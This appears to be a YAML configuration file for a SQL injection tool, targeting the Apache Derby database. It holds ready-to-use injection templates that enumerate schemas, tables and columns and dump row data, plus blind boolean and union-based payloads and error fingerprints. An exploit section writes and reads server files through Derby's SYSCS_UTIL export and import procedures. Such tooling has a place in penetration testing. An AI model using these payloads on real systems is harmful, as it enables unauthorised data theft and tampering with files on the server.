vendor: Derby

resource:
 info: |
  select
      '-'
      || '${enclose_value_sql}'
      || current schema
      || '${enclose_value_sql}'
      || current_user
      || '${trail_sql}'
  from sysibm.sysdummy1

 schema:
  database: |
   /**
    * aggreg function return exec fault
    * select item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
    * => use limit 1,1 instead
    */
   select
       '${enclose_value_sql}'
       || schemaname
       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
   FROM sys.sysschemas
   ${limit}

  table: |
   select
       '${enclose_value_sql}'
       || trim(tablename)
       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
   from sys.systables t
   inner join sys.sysschemas s on t.schemaid = s.schemaid
   where schemaname='${database}'
   ${limit}

  column: |
   select
       '${enclose_value_sql}'
       || trim(columnname)
       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
   from sys.systables t
   inner join sys.sysschemas s on t.schemaid = s.schemaid
   inner join sys.syscolumns c on t.tableid = c.referenceid
   where schemaname = '${database}'
   and tablename = '${table}'
   /**
    * TODO casting numeric to string not possible with getValues()
    * => hiding numeric columns
    * Replace % in like
    */
   and columndatatype || '' not like 'DOUBLE%25'
   and columndatatype || '' not like 'INTEGER%25'
   and columndatatype || '' not like 'DECIMAL%25'
   and columndatatype || '' not like 'BLOB%25'
   ${limit}

  row:
   query: |
    select
        '${enclose_value_sql}'
        || ${fields}
        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    from ${database}.${table}
    ${limit}
   fields:
    field: trim(coalesce(${field.value}, ''))
    concat: "|| '%7f' ||"

 exploit: |
  # [contribute] share following exploit methodologies on GitHub to improve the app :
  # - read and write files
  # - UDF creation
  # - RCE
  
  file:
    write: ; create table %s(c varchar(9999)); insert into %s(c) values ('%s'); CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY('select * from %s', '%s',null,null,null)
    createTable: ; create table %s(c varchar(9999)); CALL SYSCS_UTIL.SYSCS_IMPORT_TABLE(current schema,UCASE('%s'),'%s',null,null,null,0)
    # file not complete
    read: select '${enclose_value_sql}' || coalesce(c,'\n') || '\n${separator_qte_sql}0${enclose_value_sql}${trail_sql}' from %s ${limit}

strategy:
 configuration:
  slidingWindow: |
   select
       /**
        * If reach end of string (${lead}i) then NULLIF nullifies the result
        */
       '${lead}'
       || nullif(
           substr(
               (${injection}),
               ${window.char}
           ),
           '${trail_sql}'
       )
   from sysibm.sysdummy1
  limit: offset ${limit.value} rows fetch next 1 rows only
  failsafe: |
   trim(
       cast(
           (1337${indice}7330%2b1)
           as char(254)
       )
   )
  calibrator: "'${calibrator_raw}'"
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - derby database
    - javadb
   orderByErrorMessage:
    - Column position '1337' is out of range for the query expression
   vendorSpecific: 0=(select CASE WHEN ${test} THEN 0 ELSE 1%2bIDENTITY_VAL_LOCAL()END from sysibm.sysdummy1)

 binary:
  test:
   bin: |
    substring(
        ${injection},
        ${window.char},
        1
    )
    %3E%3D'${mid}'
   truthyBin:
    - "'a'%3E%3D'a'"
    - "'a'%3E%3D'A'"
    - "'a'%3E%3D'0'"
    - "'b'%3E%3D'a'"
    - "'b'%3E%3D'B'"
    - "'1'%3E%3D'0'"
   falsyBin:
    - "'a'%3E%3D'b'"
    - "'A'%3E%3D'a'"
    - "'B'%3E%3D'b'"
    - "'B'%3E%3D'a'"
    - "'0'%3E%3D'A'"
    - "'0'%3E%3D'1'"
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}

 union:
  indices: union select ${indices} from sysibm.sysdummy1
  capacity: (select '${lead}${indice}' || ${calibrator} from sysibm.sysdummy1)
  orderBy: order by 1337